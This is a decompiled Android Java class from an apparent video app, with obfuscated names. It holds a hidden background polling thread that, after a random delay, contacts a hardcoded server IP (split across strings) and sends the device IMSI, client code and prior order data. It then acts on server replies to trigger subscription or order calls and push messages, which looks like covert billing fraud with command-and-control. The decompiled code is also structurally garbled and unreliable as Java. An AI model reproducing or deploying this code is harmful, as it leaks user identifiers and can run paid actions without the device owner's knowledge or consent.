package com.zyypt.video.mpdemo.implbyself;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.util.Xml;
import com.mv.xing2.Util;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.HashMap;
import java.util.Random;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.params.ConnManagerParams;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EncodingUtils;
import org.xmlpull.v1.XmlPullParser;

public class f
  extends Thread
{
  private MPDestService a;
  private int b;
  private int c;
  private Random d = new Random();
  private boolean e = false;
  
  public f(MPDestService paramMPDestService)
  {
    this.a = paramMPDestService;
    this.b = (this.d.nextInt(3000) + 600);
    this.c = 0;
  }
  
  private HashMap a(String paramString)
  {
    Object localObject2;
    for (;;)
    {
      try
      {
        paramString = new ByteArrayInputStream(paramString.trim().getBytes());
        localXmlPullParser = Xml.newPullParser();
        localXmlPullParser.setInput(paramString, "UTF-8");
        i = localXmlPullParser.getEventType();
        localObject1 = null;
        paramString = null;
        localObject2 = paramString;
        if (i != 1) {
          switch (i)
          {
          }
        }
      }
      catch (Exception localException1)
      {
        XmlPullParser localXmlPullParser;
        int i;
        Object localObject1;
        paramString = null;
        localException1.printStackTrace();
        localObject2 = paramString;
      }
      try
      {
        i = localXmlPullParser.next();
      }
      catch (Exception localException2)
      {
        continue;
      }
      continue;
      try
      {
        localObject2 = localXmlPullParser.getName().trim();
        if (((String)localObject2).equals("document"))
        {
          localObject1 = new HashMap(32);
          localObject2 = localObject1;
          paramString = (String)localObject1;
          localObject1 = localObject2;
          continue;
        }
        if (!"IsNew".equals(localObject2)) {
          continue;
        }
        if (!localXmlPullParser.nextText().trim().equals("true")) {
          break label366;
        }
        bool = true;
      }
      catch (Exception localException3)
      {
        continue;
        boolean bool = false;
        continue;
      }
      this.e = bool;
      continue;
      if ("MsgId".equals(localObject2))
      {
        d(localXmlPullParser.nextText());
      }
      else if (((String)localObject2).equals("subscriber"))
      {
        localObject1 = new HashMap(32);
        paramString.put("subscriber", localObject1);
      }
      else if (((String)localObject2).equals("apppush"))
      {
        localObject1 = new HashMap(32);
        paramString.put("apppush", localObject1);
      }
      else
      {
        ((HashMap)localObject1).put(localObject2, localXmlPullParser.nextText());
        continue;
        localObject2 = localXmlPullParser.getName().trim();
        if (!((String)localObject2).equals("subscriber"))
        {
          bool = ((String)localObject2).equals("apppush");
          if (!bool) {}
        }
        else
        {
          localObject1 = paramString;
          localObject2 = paramString;
          paramString = (String)localObject1;
          localObject1 = localObject2;
        }
      }
    }
    return localObject2;
  }
  
  private void a()
  {
    Object localObject = new StringBuffer(256);
    ((StringBuffer)localObject).append("http://114.215.187");
    ((StringBuffer)localObject).append(".159/deamon/index.php/SdkConfig/newUser");
    localObject = c(((StringBuffer)localObject).toString());
    try
    {
      b((String)localObject);
      return;
    }
    catch (Exception localException) {}
  }
  
  private void a(HashMap paramHashMap)
  {
    Bundle localBundle = new Bundle();
    String[] arrayOfString = new String[3];
    arrayOfString[0] = "Title";
    arrayOfString[1] = "Summary";
    arrayOfString[2] = "MsgUri";
    int j = arrayOfString.length;
    int i = 0;
    while (i < j)
    {
      String str1 = arrayOfString[i];
      String str2 = (String)paramHashMap.get(str1);
      if (str2 != null) {
        localBundle.putString(str1, str2);
      }
      i += 1;
    }
    paramHashMap = new Intent("com.daemon.video.msgpush.implbyself.show_daemon");
    paramHashMap.putExtras(localBundle);
    this.a.sendBroadcast(paramHashMap);
  }
  
  private String b()
  {
    String str = "";
    Object localObject4 = new File(this.a.getFilesDir(), "msgId.txt");
    Util.Log("write: " + ((File)localObject4).getAbsolutePath());
    Object localObject2 = str;
    localObject1 = str;
    try
    {
      if (((File)localObject4).exists())
      {
        localObject1 = str;
        localObject4 = new FileInputStream(((File)localObject4).getAbsolutePath());
        localObject1 = str;
        localObject2 = new byte[((FileInputStream)localObject4).available()];
        localObject1 = str;
        ((FileInputStream)localObject4).read((byte[])localObject2);
        localObject1 = str;
        localObject2 = EncodingUtils.getString((byte[])localObject2, "UTF-8");
        localObject1 = localObject2;
        ((FileInputStream)localObject4).close();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
        Object localObject3 = localObject1;
      }
    }
    Util.Log("@@@@readMsgId-res: " + (String)localObject2);
    return localObject2;
  }
  
  private String b(String paramString)
  {
    ByteArrayOutputStream localByteArrayOutputStream = null;
    paramString = new HttpGet(paramString);
    Object localObject = this.a.d().getString("UserAgent", null);
    if (localObject != null) {
      paramString.setHeader("User-Agent", (String)localObject);
    }
    localObject = new DefaultHttpClient();
    HttpParams localHttpParams = ((HttpClient)localObject).getParams();
    HttpConnectionParams.setConnectionTimeout(localHttpParams, 6000);
    HttpConnectionParams.setSoTimeout(localHttpParams, 6000);
    ConnManagerParams.setTimeout(localHttpParams, 6000L);
    localObject = ((HttpClient)localObject).execute(paramString);
    paramString = localByteArrayOutputStream;
    if (((HttpResponse)localObject).getStatusLine().getStatusCode() == 200)
    {
      paramString = ((HttpResponse)localObject).getEntity().getContent();
      localByteArrayOutputStream = new ByteArrayOutputStream();
      localObject = new byte['Ð€'];
      for (;;)
      {
        int i = paramString.read((byte[])localObject, 0, 1024);
        if (i == -1) {
          break;
        }
        localByteArrayOutputStream.write((byte[])localObject, 0, i);
      }
      localByteArrayOutputStream.flush();
      localByteArrayOutputStream.close();
      paramString.close();
      paramString = localByteArrayOutputStream.toString();
    }
    return paramString;
  }
  
  private void b(HashMap paramHashMap)
  {
    Object localObject1 = (String)paramHashMap.get("isallow");
    if ((localObject1 == null) || (!((String)localObject1).equals("3"))) {}
    for (;;)
    {
      return;
      localObject1 = new Bundle();
      Object localObject2 = new String[7];
      localObject2[0] = "nodeid";
      localObject2[1] = "contentid";
      localObject2[2] = "liveid";
      localObject2[3] = "productid";
      localObject2[4] = "sdk_version";
      localObject2[5] = "aaa";
      localObject2[6] = "bbb";
      int j = localObject2.length;
      int i = 0;
      Object localObject3;
      Object localObject4;
      if (i < j)
      {
        localObject3 = localObject2[i];
        localObject4 = (String)paramHashMap.get(localObject3);
        if (localObject4 != null)
        {
          ((Bundle)localObject1).putString((String)localObject3, (String)localObject4);
          Util.Log((String)localObject3 + ":" + (String)localObject4);
        }
        for (;;)
        {
          i += 1;
          break;
          ((Bundle)localObject1).putString((String)localObject3, "");
          Util.Log((String)localObject3 + ": (null)");
        }
      }
      try
      {
        ((Bundle)localObject1).putInt("productsource", Integer.parseInt((String)paramHashMap.get("productsource")));
        ((Bundle)localObject1).putInt("playertype", 4);
        ((Bundle)localObject1).putInt("geturl", 1);
        ((Bundle)localObject1).putString("rate", "3");
        ((Bundle)localObject1).putString("begin", "010000");
        ((Bundle)localObject1).putString("end", "000000");
        this.a.a((Bundle)localObject1, (String)paramHashMap.get("channelid"), (String)paramHashMap.get("appid"), (String)paramHashMap.get("packagename"), (String)paramHashMap.get("publickey"), (String)paramHashMap.get("key"));
        localObject2 = (HashMap)paramHashMap.get("subscriber");
        if (localObject2 != null)
        {
          localObject3 = new String[7];
          localObject3[0] = "nodeid";
          localObject3[1] = "contentid";
          localObject3[2] = "liveid";
          localObject3[3] = "productid";
          localObject3[4] = "sdk_version";
          localObject3[5] = "aaa";
          localObject3[6] = "bbb";
          localObject4 = new StringBuilder();
          j = localObject3.length;
          i = 0;
          for (;;)
          {
            if (i >= j) {
              break label584;
            }
            localObject5 = localObject3[i];
            localObject1 = (String)((HashMap)localObject2).get(localObject5);
            if (localObject1 == null) {
              break;
            }
            int k = ((String)localObject1).indexOf(",");
            paramHashMap = (HashMap)localObject1;
            if (k != -1) {
              paramHashMap = ((String)localObject1).substring(0, k);
            }
            ((StringBuilder)localObject4).append(paramHashMap).append(",");
            Util.Log(localObject5 + ":" + paramHashMap);
            i += 1;
          }
        }
      }
      catch (Exception localException)
      {
        for (;;)
        {
          Object localObject5;
          localException.printStackTrace();
          continue;
          ((StringBuilder)localObject4).append("(null)").append(",");
          Util.Log(localObject5 + ": (null)");
        }
        label584:
        paramHashMap = ((StringBuilder)localObject4).toString();
        Util.Log("subscriber data:" + paramHashMap);
        this.a.a(paramHashMap);
      }
    }
  }
  
  private String c(String paramString)
  {
    String str2 = null;
    Object localObject = this.a.d();
    String str1;
    if (paramString != null)
    {
      str1 = paramString;
      if (paramString.length() != 0) {}
    }
    else
    {
      str1 = ((SharedPreferences)localObject).getString("Server", null);
    }
    paramString = str2;
    if (str1 != null)
    {
      paramString = new StringBuffer(64);
      paramString.append(str1);
      str1 = ((SharedPreferences)localObject).getString("lastOrderChannelid", "");
      str2 = ((SharedPreferences)localObject).getString("lastOrderTime", "0");
      localObject = Util.getIMSI(this.a);
      String str3 = Util.getUserAgent();
      String str4 = Util.getClientCode(this.a);
      String str5 = Build.VERSION.SDK;
      paramString.append("?lastOrderChannelid=" + str1);
      paramString.append("&lastOrderTime=" + str2);
      paramString.append("&wdimsi=" + (String)localObject);
      paramString.append("&wdua=" + str3);
      paramString.append("&clientcode=" + str4);
      paramString.append("&sdk_version=" + str5);
      paramString.append("&client_version=" + "2.1.3");
      switch (Util.checkNetWork(this.a))
      {
      }
    }
    for (;;)
    {
      long l = this.a.getSharedPreferences("TESTSDKJar", 0).getLong("first_start_time", 0L);
      l = (System.currentTimeMillis() - l) / 86400000L;
      paramString.append("&days=" + l);
      str1 = b();
      if ((str1 != null) && (str1.length() > 0))
      {
        Util.Log("msgId!=222= null======");
        paramString.append("&msgid=" + str1);
      }
      paramString = paramString.toString();
      return paramString;
      paramString.append("&net_type=WLAN");
      continue;
      paramString.append("&net_type=WAP");
      continue;
      paramString.append("&net_type=NET");
    }
  }
  
  private void d(String paramString)
  {
    Object localObject = new File(this.a.getFilesDir(), "msgId.txt");
    Util.Log("write: " + ((File)localObject).getAbsolutePath());
    Util.Log("text======" + paramString);
    try
    {
      if (((File)localObject).exists()) {
        ((File)localObject).delete();
      }
      ((File)localObject).createNewFile();
      localObject = new FileWriter((File)localObject, true);
      ((FileWriter)localObject).write(paramString);
      ((FileWriter)localObject).close();
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public void run()
  {
    Util.Log("PollingThread=Thread Start...");
    int i = this.b;
    label296:
    for (;;)
    {
      long l;
      if (!isInterrupted()) {
        l = i * 1000;
      }
      try
      {
        Thread.sleep(l);
        localObject = c(null);
        Util.Log("req======" + (String)localObject);
        localObject = b((String)localObject);
        Util.Log("resp======" + (String)localObject);
        localObject = a((String)localObject);
        int j = Integer.parseInt((String)((HashMap)localObject).get("MsgNext"));
        i = j;
      }
      catch (InterruptedException localInterruptedException)
      {
        try
        {
          Object localObject;
          this.c = 0;
          String str = Util.javaGetDataFromSharedPref(this.a, "pollingFirst");
          if ((str == null) || (str.length() == 0))
          {
            Util.javaSetDataToSharedPref(this.a, "pollingFirst", "false");
            localObject = Util.javaGetDataFromSharedPref(this.a, "polling_first_run");
            if ((localObject != null) && (((String)localObject).length() != 0)) {
              break label296;
            }
            a();
            Util.javaSetDataToSharedPref(this.a, "polling_first_run", "false");
            break label296;
          }
          this.a.e().post(new g(this, (HashMap)localObject));
        }
        catch (Exception localException2)
        {
          for (;;) {}
        }
        localInterruptedException = localInterruptedException;
        Util.Log("PollingThread=Thread Interrupted...");
        Util.Log("PollingThread=Thread End...");
        return;
      }
      catch (Exception localException1)
      {
        this.c += 1;
        if (this.c >= 5) {
          this.a.e().post(new h(this));
        }
        localException1.printStackTrace();
      }
    }
  }
}
